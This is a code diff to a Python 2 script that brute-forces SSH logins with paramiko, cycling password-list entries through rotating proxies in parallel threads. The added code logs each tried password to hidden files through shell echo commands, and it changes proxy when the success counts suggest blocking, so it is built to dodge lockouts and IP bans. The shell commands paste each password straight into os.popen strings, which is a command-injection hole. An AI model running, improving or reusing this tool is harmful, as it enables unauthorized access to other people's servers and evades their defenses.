@@ -32,20 +32,40 @@ def request(proxy, p_proxy, password):
 	    client = paramiko.SSHClient()
 	    client.load_system_host_keys()
 	    client.set_missing_host_key_policy(paramiko.WarningPolicy)
+
+######################################################### 
+#           I tryed all this options to bypass the key whey im using a proxy
+#           but no one worked for me. If someone find out how do it, please, tell me. Thanks
+#
+#	    client.load_host_keys('/root/.ssh/known_hosts')
+#           client.load_system_host_keys()
+#           client.set_missing_host_key_policy(paramiko.WarningPolicy)
+#           client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+#           client.load_system_host_keys()
+#           hostkey = ""
+#           hostkey = paramiko.py3compat.decodebytes(hostkey)
+#           keyObj = RSAKey(data=hostkey)
+#           keyObj = RSAKey(data=decodebytes(know_host_key.encode()))
+#           client.get_host_keys().add(hostname=hostname, keytype="ssh-rsa", key=keyObj)
+#           chan = client.get_transport().open_session()
+#############################################################
+	
+	
+	
 	    client.connect(hostname, port=port, username=username, password=password, timeout=10)
 	    print ">>>>>>>>>>>>>>>>  Success: " + password
 	    client.close()
 	    exit()
 	except Exception as e:
 	   if 'Authentication failed.' in e:
-		print "failed login"
-		pass
+		script = "echo " + password+ " >> .done.txt"
+		os.popen(script)
 	   else:
 		script = "echo " + password+ " >> no_done.txt"
 		os.popen(script)
 		print "WRONG"
 
-no_done = open("no_done.txt","w+")
+
 pass_file = open(sys.argv[4])
 lines_pass = pass_file.readlines()
 
@@ -62,7 +82,7 @@ proxy_pos = 0
 for pos in range(0,int(leng_pass)):
 
     if proxy_pos >= int(leng_proxy):
-	proxy_pos = 0
+        proxy_pos = 0
     proxy = (lines_proxy[proxy_pos]).rstrip()
     ip_proxy = proxy.split()[0]
     port_proxy = int(proxy.split()[1])
@@ -70,8 +90,25 @@ for pos in range(0,int(leng_pass)):
     password = (lines_pass[pos]).rstrip()
 
     try:
-	t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
-	t1.start()
-	time.sleep(0.3)
+        t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
+        t1.start()
+        time.sleep(0.3)
     except:
-	no_done.write("no_done.txt")
+        script = "echo " + password+ " >> .no_done.txt"
+        os.popen(script)
+
+    if pos%40 == 0 and pos != 0 or int(os.popen('cat .ch').read()) == 1:
+        time.sleep(3)
+        script = "cat .no_done.txt| wc -l"
+        n = int(os.popen(script).read())
+        script = "cat .done.txt| wc -l"
+        d = int(os.popen(script).read())
+
+        print "CHECK RESULT"
+        r = d - n - rr
+        rr = rr + r
+        print str(r) + " Diferencia"
+
+        if r < 0 or int(os.popen('cat .ch').read()) == 1:
+            print "CHANGING PROXY"
+            proxy_pos = proxy_pos + 1
